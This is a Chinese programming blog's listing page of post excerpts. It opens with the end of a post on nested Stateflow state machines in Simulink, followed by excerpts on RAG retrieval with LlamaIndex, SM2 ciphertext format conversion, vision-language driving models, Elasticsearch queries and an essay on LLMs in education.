两级状态机 两级状态机是在某个State里边直接放入一个Stateflow，示例如下：
从上图可以看出，外层s1每次进入之后，一方面正常执行自有的代码（Cnt=Cnt+1;），另一方面也有序地执行内层的Stateflow。当外层s1退出时，内层的Stateflow也全部退出。当外层s1重新进入时，内层的Stateflow不管前一次停在哪个State，这时候都要从初始State（s2）开始执行。
函数状态机 函数状态机是在某个State里边放入一个Simulik Function，然后再在里边放入一个Stateflow，以此间接实现状态机嵌套的目的，示例如下：
从图上可以看出，外层Stateflow进入s1之后，嵌套在s1内部的Simulik Function也被调用起来，Fcn()实际上也是一个Stateflow。跟前面的两级状态机相比，外层Stateflow基本没有区别，内层Stateflow也是完全一样，正常理解的话应该运行得到相同的结果。实际运行起来看到了很关键的差异，就是外层State每次进入后，内层Stateflow运行的起点不一样。第一次外层进入s1时，内层是从初始State（s2）开始执行的。第二次外层进入s1时，内层直接就从s3开始执行。后面外层每次进入s1，内层都从s3开始执行。
分析和应用 1、两级状态机的外层State每次重新进入时，内层的Stateflow不管原本停在哪个State，都会回到初始State重新开始运行。这种状态机嵌套模式，内层的Stateflow是没有“记忆”的，适合应用于有初始化操作或者有复位操作的系统，比如带有累加功能或者积分功能的应用，每次重新启动都需要清零操作。
2、函数状态机的外层State每次重新进入时，内层的Stateflow都会先找到原本停在哪个State，然后从那里开始继续运行。这种状态机嵌套模式，能保证内层的Stateflow有准确“记忆”，适合应用于需要暂存数据的系统，比如有固定执行序列的应用，当应用被打断又重新恢复时，需要从原有的位置开始运行。
总结 以上就是本人在研发中使用Stateflow中的状态机嵌套时，一些个人理解和分析的总结，主要是对比介绍了两种状态机嵌套方式的基本规律，展示了仿真运行的效果，并分析了它们的特点和适用场景。
后续还会分享另外几个最近解锁的Matlab/Simulink新技能，欢迎评论区留言、点赞、收藏和关注，这些鼓励和支持都将成文本人持续分享的动力。
另外，上述例程使用的Demo工程，可以到笔者的主页查找和下载。
参考资料 Mathworks Help -&gt; Stateflow 版权声明，原创文章，转载和引用请注明出处和链接，侵权必究！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e9cebd17944f824d369443d976ab923a/" rel="bookmark">
			【2024构建RAG问答系统】深度解析LlamaIndex自动合并检索框架，大语言模型必知
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		🔍 📱 嘿，Chatbot爱好者！今天我们来深入解析一个超强的文档检索和问答系统框架！🚀
🧠 你是否曾经面对海量文档感到头痛？需要快速精准回答问题却不知从何下手？别担心，这个基于LlamaIndex和TruLens的框架就是你的救星！
🔍 本文将为你揭秘：
如何构建多层次智能索引自动合并检索的魔法精准重排序的秘诀性能评估的必杀技 🌟 无论你是工程师、数据科学家，还是对智能问答系统感兴趣的极客，这篇文章都能让你收获满满！
🏗️ 首先是框架整体设计
索引构建 - 文档的多重变身
使用HierarchicalNodeParser进行文档分层VectorStoreIndex创建向量存储索引持久化，方便随时调用 查询引擎 - 智能检索的核心
基础检索 + 自动合并 = 超强理解力SentenceTransformerRerank保证结果精准度 评估系统 - 性能监控利器
TruLens记录每一次查询可视化仪表板直观展示系统表现 💡 核心组件解析: 🌳 HierarchicalNodeParser - 文档分层的秘密武器 node_parser = HierarchicalNodeParser.from_defaults(chunk_sizes=chunk_sizes) nodes = node_parser.get_nodes_from_documents(documents) leaf_nodes = get_leaf_nodes(nodes) 这个解析器就像一个超级智能的剪刀✂️,它能将文档切分成不同大小的片段。想象一下,你有一本厚厚的百科全书:
2048字符可能对应一个章节512字符可能是一个小节128字符可能就是一两个段落 为什么要这样做?因为不同的问题需要不同粒度的信息!比如"解释相对论"可能需要整个章节,而"爱因斯坦出生年份"可能一个句子就够了。
🔄 AutoMergingRetriever - 自动合并的魔法师 retriever = AutoMergingRetriever( base_retriever, automerging_index.storage_context, verbose=True ) 这个检索器简直就是一个魔法师🧙‍♂️!它不仅能找到相关的文本片段,还能自动将它们合并。想象一下,你问"苹果公司的发展历程",它能自动将"乔布斯创立苹果"、"iPhone发布"、"Tim Cook接任CEO"这些片段智能地组合在一起!
📊 VectorStoreIndex - 高效检索的幕后英雄 automerging_index = VectorStoreIndex( leaf_nodes, storage_context=storage_context, service_context=merging_context ) 这个索引就像一个超级图书管理员👨‍💼,它将所有文本片段转化为向量,并用一种特殊的方式存储。当你问问题时,它能以光速找到最相关的片段!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e9cebd17944f824d369443d976ab923a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7d72ae8003d4f1e4f33d4afb9f8736ed/" rel="bookmark">
			鸿蒙系统开发【ASN.1密文转换】安全
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ASN.1密文转换 介绍 本示例对使用@kit.CryptoArchitectureKit加密后的密文格式进行转换。@kit.CryptoArchitectureKit加密后的密文格式默认为以base64显示的ASN.1格式问题，通过对密文进行base64变换后得到字符数组，以16进制数字显示，再此基础上进行密文格式转换，从ASN.1格式转换为c1c3c2格式的裸密文，再以c1c3c2格式的裸密文进行解密，以验证密文转换的正确性。
效果预览 使用说明
点击主页面加密按钮，对原始数据使用SM2国密算法进行加密，其内容显示在加密数据文本框中， 此时解密按钮和base64转换按钮使能点击主页面base64转换按钮，对原始密文进行base64转换，在加密数据文本框中显示转换后的密文 此时asn.1转换按钮使能点击主页面asn.1转换按钮，对密文进行asn.1转换，在加密数据文本框中显示转换后的密文 此时加密按钮和base64转换按钮去使能点击主页面解密按钮，对密文进行解密，在解密数据文本框中显示解密后的文本 此时解密按钮去使能 具体实现 对文本加密：在[SM2.ets] 点击加密按钮，调用加密函数实现对文本内容进行加密。点击解密按钮，调用解密函数实现对文本内容进行解密. 对消息加密的过程中采用cryptoFramework.Cipher完成加解密操作。 import { cryptoFramework } from '@kit.CryptoArchitectureKit'; import { print } from '@kit.BasicServicesKit'; import { buffer, util } from '@kit.ArkTS'; import { SM2CipherText } from './SM2CipherText'; async function genECCPubKey(key: string) { let mode: number = 1; let pk: cryptoFramework.Point = { x: BigInt(""), y: BigInt(""), }; if ((mode &amp; 0x01) != 0 &amp;&amp; key != null) { pk = { x: BigInt("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7d72ae8003d4f1e4f33d4afb9f8736ed/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/73fdcf978de56762c465ca667ab0d9e7/" rel="bookmark">
			用于仅摄像头闭环驾驶的视觉语言模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CarLLaVA: Vision language models for camera-only closed-loop driving 用于仅摄像头闭环驾驶的视觉语言模型 Abstract In this technical report, we present CarLLaVA, a Vision Language Model (VLM) for autonomous driving, developed for the CARLA Autonomous Driving Challenge 2.0. CarLLaVA uses the vision encoder of the LLaVA VLM and the LLaMA architecture as backbone, achieving state-ofthe-art closed-loop driving performance with only camera input and without the need for complex or expensive labels. Additionally, we show preliminary results on predicting language commentary alongside the driving output.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/73fdcf978de56762c465ca667ab0d9e7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9021e10b7718bdd079d769c1486d1c1b/" rel="bookmark">
			使用 MinIO、Langchain 和 Ray Data 构建分布式嵌入式子系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		嵌入子系统是实现检索增强生成所需的四个子系统之一。它将您的自定义语料库转换为可以搜索语义含义的向量数据库。其他子系统是用于创建自定义语料库的数据管道，用于查询向量数据库以向用户查询添加更多上下文的检索器，最后是托管大型语言模型 （LLM） 的服务子系统，并将根据用户的查询和在向量数据库中找到的上下文生成答案。下图显示了这四个子系统在检索增强生成过程中如何协同工作。
在这篇文章中，我想重点介绍嵌入子系统。在此子系统中，构成组织自定义语料库的文档从其原始格式转换为文本，分解为较小的块，然后为每个块创建一个嵌入（这是一个向量，通常具有数百个维度）。创建嵌入后，原始块和向量都将存储在向量数据库中。 嵌入子系统在概念上易于理解，并且实现嵌入简单文本文件的简单脚本非常简单。但是，如果您必须为您的组织实施嵌入子系统，那么您如何为您的组织做出正确的设计决策，以及您如何应对不断增长的需求带来的复杂性？下面列出了一些设计决策和实际复杂性：
如何高效地运行多个实验来测试不同的配置选项？
如何处理文档中的表格和图像？
如何将嵌入子系统部署到生产环境中？
如何处理需要嵌入的大量文档？
什么是最好的载体数据库？
文档、嵌入模型和LLMs的最佳存储选项是什么？
解决这些问题的第一步是使用能够在工程工作站以及生产环境中运行的现代工具。具体来说，我们将使用 MinIO 进行所有存储，使用 Langchain 作为低代码解决方案来进行文档解析（我还将提供一些比 Langchain 更好地处理图像和表的选项），并使用 Ray Data 将分块和嵌入函数分发到集群中。毫不奇怪，分布式技术是我们解决方案的基础。您不仅可以使用商用硬件设置进行并行处理来获得高吞吐量，而且该解决方案是云原生的，使其可以跨云移植，并且还能够在本地运行。让我们从为我们的实验设置一个自定义语料库开始。
在 MinIO 中设置自定义语料库 如上所述，自定义语料库由数据管道创建，该数据管道将可能位于组织中多个门户的文档聚合到 MinIO 中。创建文档管道是另一篇文章的主题 - 所以现在，我们将手动将一些文档暂存到 MinIO 桶中。我在这里也只会使用文本文档来保持简单。但是，这里有一些处理文档中多种文件格式和非文本的提示。首先，查看 Unstructured 的库，用于分区、清理和提取。其次，如果您专门处理 PDF，请查看 Open-Parse 库。我们在之前的博客文章《使用 Open-Parse 智能分块提高 RAG 性能》中介绍了 Open-Parse。下面的屏幕截图显示了我们的自定义语料库。我从古腾堡计划中下载了四本被认为是经典的流行书籍的文本版本。
人性论——大卫·休谟
孙子兵法 - 孙子
杰基尔博士和海德先生的奇案 - 罗伯特·路易斯·史蒂文森
《海底两万里》——儒勒·凡尔纳
现在我们有了一个自定义语料库，我们可以设置一个向量数据库来保存嵌入。
设置 MinIO 和矢量数据库 我将使用的向量数据库是 Pgvector。Pgvector 是 PostgreSQL 的开源扩展，允许用户在数据库中存储、搜索和分析矢量数据。这篇文章的代码下载有一个 docker-compose 文件，其中包含 MinIO、Pgvector 和 pgAdmin。在与 docker-compose fill 相同的目录中运行以下命令会将这三个服务作为容器显示出来。
docker-compose up -d
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9021e10b7718bdd079d769c1486d1c1b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ce7b8ed37a250fb9b99d84e66aa212df/" rel="bookmark">
			大语言模型时代的挑战与机遇：青年发展、教育变革与就业前景
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		摘要:
当前,大语言模型技术的崛起正在对多个领域带来深远影响,其中教育与就业便是重点受影响领域之一。本文旨在深入探究大语言模型对青年群体发展、教育体系变革以及就业前景的影响,并提出相应的应对措施与建议。
通过运用社会认知理论、建构主义教育理论、技能匹配理论等学理知识,本文分析了大语言模型给予青年群体带来的认知影响、教育模式的必然变革以及职业发展的新形势。具体而言,在社会认知层面,大语言模型有助于拓宽青年接触信息的渠道,但也可能加剧认知偏差;在教育层面,基于大语言模型的个性化学习模式或将取代传统教学,教师角色将发生重大转变;在就业层面,人工智能将替代部分岗位,技能匹配面临新挑战。
基于上述分析,本文提出应积极培养青年的批判性思维能力,构建以学习者为中心的教育新范式,深化产教融合,促进技能有效转移等应对之策。最后,本文呼吁全社会共同关注大语言模型的发展态势,为青年一代高质量成长、教育体系持续优化以及劳动力市场健康发展创造良好条件。
关键词:大语言模型;青年发展;教育变革;就业前景;社会认知;建构主义;技能匹配
一、前言
语言是人类进化过程中最伟大的发明,自古以来,语言一直是人类认知、交流和传播知识的重要工具。然而,随着人工智能技术的不断发展,尤其是大语言模型(Large Language Model,LLM)的兴起,语言处理领域正在发生革命性的变化。大语言模型是一种利用海量文本数据训练而成的人工智能模型,能够生成看似人性化的自然语言输出,在对话、文本创作、问答等多个场景展现出了强大的能力。
毫无疑问,大语言模型的崛起必将深刻影响人类社会的方方面面,其中教育与就业领域尤为受关注。本文旨在探讨大语言模型对青年一代的发展、教育体系的变革以及就业前景带来的影响,并提出相应的应对之策,以期为相关决策者提供有价值的参考。
二、理论基础
(一)社会认知理论与青年发展
社会认知理论(Social Cognitive Theory)认为,个体的认知过程受到环境因素和个人特质的交互影响。青年时期正是个体认知能力快速发展的关键阶段,外部信息来源和学习环境对其认知发展具有深远影响。
大语言模型作为一种新型信息来源,必将影响青年人的信息获取和知识建构方式。一方面,大语言模型能为青年提供丰富的知识内容和创造性素材,拓宽其学习视野;另一方面,由于大语言模型本身存在一定的偏差和不确定性,过度依赖可能加剧青年的认知偏差,阻碍其独立思考和创新意识的培养。
(二)建构主义教育理论与教育创新
建构主义教育理论(Constructivism Learning Theory)主张知识不是简单的接受,而是learner在既有经验基础上主动建构的过程。教师在这一过程中扮演引导者的角色,营造有利于学习者主动探索和建构知识的环境。
大语言模型技术为因材施教、个性化学习提供了新的途径。教师可利用大语言模型根据学生实际情况量身定制教学内容和互动方式,学生则可通过与大语言模型的对话探索和建构知识。显然,这种由人工智能主导的个性化学习模式将彻底重塑传统的教学方法,教师的角色将从知识灌输者转变为学习过程的组织者和引导者。
(三)技能匹配理论与职业发展
技能匹配理论(Skill Mismatch Theory)认为,员工技能与工作岗位要求之间的匹配程度,是影响就业质量和职业发展的关键因素。当前我国正面临严峻的结构性就业失衡问题,技能供给与市场需求之间存在明显的错位现象。
大语言模型所代表的人工智能技术的崛起,无疑将给未来的就业市场带来全新的冲击。一方面,人工智能有望替代大量重复性劳动,使得一部分传统工作岗位面临被取代的风险;另一方面,人工智能技术的应用也将催生新的就业机会,对人力资源的技能要求也将发生变化。因此,如何实现技能有效转移,缓解技能失衡,是青年群体就业发展面临的重大挑战。
三、影响分析
(一)青年发展:认知视野扩展与思维偏差加剧
在信息时代,获取信息、传播知识的渠道日益多元化。大语言模型正是这一多元信息来源的全新形态,其对青年发展的影响主要体现在两个方面:
1.拓展认知视野
大语言模型汇聚了海量的人类知识,为青年人提供了一个前所未有的知识宝库,他们可以通过与大语言模型的互动来获取全新的见解和灵感,从而拓宽认知视野。以往需要查阅大量资料才能理解的复杂概念,现在只需与大语言模型对话,便可以直观梳理和掌握知识要点。这无疑为青年人学习和成长带来了极大的便利。
2.加剧认知偏差
然而,我们也应当意识到,大语言模型本身存在着一系列的不确定性和偏差,其输出结果可能存在事实错误、逻辑缺陷等问题。如果青年人过度依赖大语言模型的观点和分析,不加批判地盲目接受其输出,将会加剧其认知层面的偏差。此外,由于大语言模型存在局限性,难免会带有人类创作者的观念和三观,长期沉浸在特定语境下,青年人的多元思维和独立思考能力也将受到一定影响。
总的来说,大语言模型为青年人打开了百科全书式的知识之门,但如何合理利用这一技术获取有价值的信息,培养青年人的批判性思维能力,仍需要家庭、学校和社会各界共同努力。
(二)教育体系:因材施教与教师角色重塑
在教育领域,大语言模型的影响主要体现在两个层面:个性化学习与教师角色变革。
1.个性化学习模式
建构主义学习理论强调学习是一个主动建构知识的过程,教学应该尊重学生的经验差异,因材施教。然而,传统的教学模式由于受诸多现实制约而难以真正实现个性化。而基于大语言模型的人工智能教育系统,在实现个性化教学方面具有巨大的潜力。
首先,大语言模型能够根据学生个体的特点和学习状况,自动生成合适的教学内容和材料,从而实现精准的知识传递。其次,大语言模型可以通过持续的对话交互来监测学生的学习进程,及时发现并纠正其中的偏差和不足。再次,大语言模型可根据学生的兴趣爱好和认知水平,为其量身定制知识内容和学习路径,使学习过程更加高效、有趣。
基于大语言模型的个性化学习模式将极大提升教育的质量和效率,但与此同时也对传统教育提出了巨大的挑战。未来,教育资源将更加均衡,农村和偏远地区学生也可以获得与城市同等水平的教育服务。但另一方面,个性化学习无疑将加大教师的教学压力,教育形态将发生深刻改变。
2.教师角色转变
在传统教学模式下,教师是知识的输出者和控制者。然而,在大语言模型主导的个性化学习模式下,教师的职责和地位将发生翻天覆地的变化。因为人工智能系统可以承担知识传播的主要任务,教师将不再扮演"班主任"般的角色,而更多地充当学习的组织者、管理者和引导者。
具体而言,教师的工作重心将从"教书"转移到"育人"," Teach"转向"Coach"。学生将不再被动接受知识,而是在教师的指导下主动探索学习。教师需要为学生设计学习路线、安排互动环节、科学评价学习效果,并对学生的品行修养给予良好的引导。总之,教师将成为学生自主学习的设计师和智guided。
相较于传统的教书育人,这种全新的师生关系和教育形态或许更有利于培养学生的创新能力、独立思考和终身学习习惯。但与此同时,教师自身的专业素质也将受到严峻挑战,需要做好相应的思想准备和能力储备。
(三)就业前景:技能升级与就业形式多样化
人工智能无疑将给未来的就业市场带来巨大冲击,大语言模型作为人工智能的重要组成部分,其影响主要体现在两方面:部分就业岗位被替代以及新型就业形态的出现。
1.传统就业岗位被替代
大语言模型的核心能力在于通过海量数据训练,可以完成复杂的自然语言处理任务。因此,一些传统的文字工作、信息服务类岗位如客服、文案、翻译、新闻编辑等可能会面临较大冲击。另外,大语言模型生成的图像也开始触及到一些设计工作的领域。总的来说,任何可以被流程化、标准化的工作内容,都存在一定程度的被大语言模型等人工智能技术所替代的风险。
当然,人工智能只是一种工具和辅助手段,在很多场景下仍需要人工的介入和调整。但无疑,青年人未来将不得不面临传统就业岗位被人工智能分蚕食的严峻形势,不得不学习与人工智能工具相互协作共事的能力。
2.人机协作和新型就业形态
另一方面,大语言模型等人工智能技术的发展也将孕育出全新的就业机会。我们已经可以看到,一些基于人工智能的新兴产业正在崛起,如无人驾驶、智能语音助手、智能教育等。与此同时,人机协作、人工智能工程师等新型职业也将出现。此外,利用人工智能赋能,以个人或小团队的方式承接项目工作,构建新型的去中心化就业模式也是可能的趋势。
新型就业机会对从业者的综合技能要求更高,不仅需要扎实的专业能力,还要具备与人工智能工具高效协作的能力,以及跨学科的视野和知识结构。因此,未来的职业发展将更加注重终身学习能力和知识迁移能力。
四、应对策略
面对大语言模型给青年发展、教育变革与就业前景带来的冲击与挑战,我们需要从全社会的角度制定科学的应对措施:
(一)培养青年批判性思维,提升信息分析能力
在信息时代,获取信息固然重要,但分析、甄别信息的能力更为关键。我们应当从青少年时期开始,培养学生们的批判性思维习惯,帮助他们树立独立的人生观和价值观,不盲目追随权威,勇于质疑并坚持独立见解。
当面对大语言模型等人工智能工具输出的结果时,青年人应当保持一定的理性怀疑态度,通过多种渠道校验信息的可靠性,运用逻辑思维对内容进行甄别和辨析。只有具备了出色的信息分析能力,他们才能真正从海量信息中获取有价值的知识,防止认知偏差的加剧。
(二)重塑教育范式,构建人机协作的教学模式
教育部门、学校和教师应当认清形势,主动拥抱以人工智能为核心的新型教育模式。一方面,尽快推广并优化基于大语言模型等技术的人工智能辅助教育系统,为个性化学习创造条件;另一方面,重塑教师的角色定位,加大对教师在新教育形态中的培训力度,使其能够高效组织和引导学生的自主学习。
与此同时,我们应当进一步完善课程体系,加强人工智能、批判性思维等内容在基础教育中的渗透。从根本上确保学生在主动学习的过程中能够有效辨析信息真伪,主动形成独立见解,而不被算法主导思维。总之,新的教育范式应当是人机协作、人在控制的新型教育模式。
(三)深化产教融合,优化人力资源培养结构
大语言模型的迅猛发展正是产业变革的一个缩影。整个社会都需要保持高度警惕,及时应对未来就业形态和技能需求的变化趋势。
政府、企业和高校应当加强协同,立足新一轮科技革命和产业变革的实际需求,及时优化人力资源培养的结构和模式。一方面,传统教育理应加大对学生创新能力和复合型知识结构的培养力度;另一方面,新型人工智能工程师等岗位的专业教育资源也需要加强储备。同时,要创新教学和实践方式,加强校企合作,通过产教深度融合,缩短人力资源培养与市场需求的时滞。
(四)加强技能培训与认证,畅通职业发展通道
我国现阶段面临的最大就业挑战是教育培养与产业需求之间的结构性错位。因此,建立科学的技能培训和认证体系,实现人力资源从学校到工作的高效无缝衔接,是缓解技能错位、优化就业质量的关键。
一方面,政府应当发挥引导作用,加大对职业技能培训的支持力度,鼓励培训机构聚焦人工智能等新兴技术领域,开发针对性的培训课程。与此同时,要建立健全的技能认证体系,为获得新技能的劳动者提供权威的能力证明,维护培训质量。在技能认证方面,可借鉴大语言模型等人工智能技术实现线上化、智能化评判。
另一方面,企业作为终端用工主体,应当根据自身发展需求,主动开展新型人才培养。可以考虑在企业内部搭建培训基地,确保员工能力素质与企业实际需求相契合;也可以与高校、培训机构开展多层次的合作,为校企之间的人才交流和技术引进营造条件。
总的来说,建立健全技能培训和认证体系,是缓解当前和未来技能失衡的有效途径,有助于优化人力资源配置,推进产业转型升级。随着人工智能技术的持续突破,这一领域也将迎来更多创新实践。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ce7b8ed37a250fb9b99d84e66aa212df/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4e3a6bad4168c87d0555071ddd2dc52b/" rel="bookmark">
			【人工智能】Transformers之Pipeline（七）：图像分割（image-segmentation）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、引言 二、图像分割（image-segmentation）
2.1 概述
2.2 技术原理
2.3 应用场景
2.4 pipeline参数
2.4.1 pipeline对象实例化参数
2.4.2 pipeline对象使用参数 2.4 pipeline实战
2.5 模型排名
三、总结
一、引言 pipeline（管道）是huggingface transformers库中一种极简方式使用大模型推理的抽象，将所有大模型分为音频（Audio）、计算机视觉（Computer vision）、自然语言处理（NLP）、多模态（Multimodal）等4大类，28小类任务（tasks）。共计覆盖32万个模型
今天介绍CV计算机视觉的第三篇，图像分割（image-segmentation），在huggingface库内有800个图像分类模型。
二、图像分割（image-segmentation） 2.1 概述 图像分割就是把图像分成若干个特定的、具有独特性质的区域并提出感兴趣目标的技术和过程。它是由图像处理到图像分析的关键步骤。现有的图像分割方法主要分以下几类：基于阈值的分割方法、基于区域的分割方法、基于边缘的分割方法以及基于特定理论的分割方法等。从数学角度来看，图像分割是将数字图像划分成互不相交的区域的过程。图像分割的过程也是一个标记过程，即把属于同一区域的像素赋予相同的编号。
2.2 技术原理 图像分割（image-segmentation）的默认模型为facebook/detr-resnet-50-panoptic，全称为：DEtection TRansformer(DETR)-resnet-50-全景。其中有3个要素：
DEtection TRansformer (DETR)：于2020年5月由Facebook AI发布于《End-to-End Object Detection with Transformers》，提出了一种基于transformer的端到端目标检测方法，相比于YOLO具有更高的准确性，但速度不及YOLO，可以应用于医疗影像等不追求实时性的目标检测场景，对于追求实时性的目标检测场景，还是得YOLO，关于YOLOv10，可以看我之前的文章。ResNet-50：ResNet-50是一种深度残差网络（Residual Network），是ResNet系列中的一种经典模型。它由微软研究院的Kaiming He等人于2015年提出，被广泛应用于计算机视觉任务，如图像分类、目标检测和图像分割等。ResNet-50是一种迁移学习模型，迁移学习的核心思想是将源领域的知识迁移到目标领域中，可以采用样本迁移、特征迁移、模型迁移、关系迁移等手段。全景分割panoptic： DETR在COCO2017全景图（118k 带注释图像）上进行端到端训练，全景分割即可以将图片全景分割成多个区域，每个区域使用同一编号。 DEtection TRansformer(DETR)主体结构：
由三个主要部分组成：用于特征提取的CNN后端（ResNet）、transformer编码器-解码器和用于最终检测预测的前馈网络（FFN）。后端处理输入图像并生成激活图。transformer编码器降低通道维度并应用多头自注意力和前馈网络。transformer解码器使用N个物体嵌入的并行解码，并独立预测箱子坐标和类别标签，使用物体查询。DETR利用成对关系，从整个图像上下文中受益，共同推理所有物体。
DEtection TRansformer(DETR)应用于全景分割：
将图片内的box进行embedding后输入至MHA中提取每个box中的图片信息，采用Resnet生成激活图，采用pixel-wise（像素级别）的损失函数进行学习。pixel-wise损失函数是计算预测图像与目标图像的像素间的损失。属于像素间类型的损失函数，常见的有：MSE（L2损失），MAE（L1损失）和交叉熵等。计算机视觉领域的损失函数有3类：pixel-wise（像素级别），patch-wise（块级别），image-wise（图片级别）。
2.3 应用场景 医学影像分析：在医疗领域，图像分割用于识别和分割肿瘤、器官等，帮助医生进行诊断和手术规划。自动驾驶：车辆需要识别道路、行人、其他车辆等，图像分割技术可以辅助车辆理解周围环境，提高安全性和导航准确性。遥感与地图制作：通过分割卫星或无人机图像，可以自动识别水体、森林、建筑物等，用于城市规划、环境监测和自然资源管理。增强现实：在AR应用中，分割技术用于区分前景和背景，使得虚拟物体能够自然地融入真实世界场景中。时尚与零售：用于服装分割，帮助自动识别和分类衣物，用于在线购物的虚拟试穿或商品推荐。自然资源管理：如森林火灾监测，通过分割图像识别火源区域。体育分析：分析运动员动作，通过分割跟踪特定运动员或球的运动轨迹。 2.4 pipeline参数 2.4.1 pipeline对象实例化参数 model（PreTrainedModel或TFPreTrainedModel）— 管道将使用其进行预测的模型。 对于 PyTorch，这需要从PreTrainedModel继承；对于 TensorFlow，这需要从TFPreTrainedModel继承。image_processor ( BaseImageProcessor ) — 管道将使用的图像处理器来为模型编码数据。此对象继承自 BaseImageProcessor。modelcard（str或ModelCard，可选）— 属于此管道模型的模型卡。framework（str，可选）— 要使用的框架，"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4e3a6bad4168c87d0555071ddd2dc52b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4f72fe43f9272e5e43afa5e0840c0b44/" rel="bookmark">
			谷粒商城实战笔记-110~114-全文检索-ElasticSearch-查询
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一，110-全文检索-ElasticSearch-进阶-两种查询方式二，111-全文检索-ElasticSearch-进阶-QueryDSL基本使用&amp;match_all三，112-全文检索-ElasticSearch-进阶-match全文检索四，113-全文检索-ElasticSearch-进阶-match_phrase短语匹配五，114-全文检索-ElasticSearch-进阶-multi_match多字段匹配 一，110-全文检索-ElasticSearch-进阶-两种查询方式 Elasticsearch两种基本的检索方式使用Elasticsearch REST API的说明：
使用REST request URI发送搜索参数：
这种方式是通过GET请求将查询参数附加在URL上。这适用于简单的查询，并且可以很容易地在浏览器中测试。例如，上面的查询示例：
GET bank/_search?q=*&amp;sort=account_number:asc GET 是HTTP方法，用于请求从服务器获取资源。bank 是索引的名称。_search 是一个特殊的端点，用于执行搜索查询。q=* 是查询参数，* 表示搜索所有文档。sort=account_number:asc 指定了排序方式，这里按照account_number字段升序排序。 使用REST request body发送搜索参数：
这种方式是通过POST请求发送一个JSON格式的请求体。它提供了更复杂的查询能力，并且可以包含多个查询参数和选项。例如，上面的查询示例：
POST bank/_search { "query": { "match_all": {} }, "sort": [ { "account_number": { "order": "desc" } } ] } POST 是HTTP方法，通常用于向服务器提交要被处理的数据。bank/_search 同样指定了索引和搜索端点。请求体中的 "query": { "match_all": {} } 定义了一个查询，match_all 查询将匹配所有文档。"sort" 数组定义了排序规则，这里指定了按照account_number字段降序排序。 两种方式的主要区别在于查询的复杂性和灵活性。使用URI的方式简单直观，适合快速测试和简单的查询。使用请求体的方式则更适合复杂的查询，可以包含更多的选项和参数。
二，111-全文检索-ElasticSearch-进阶-QueryDSL基本使用&amp;match_all GET bank/_search { "query": { "match_all": {} }, "sort": [ { "balance": { "order": "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4f72fe43f9272e5e43afa5e0840c0b44/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/88/">«</a>
	<span class="pagination__item pagination__item--current">89/621</span>
	<a class="pagination__item pagination__item--next btn" href="/page/90/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>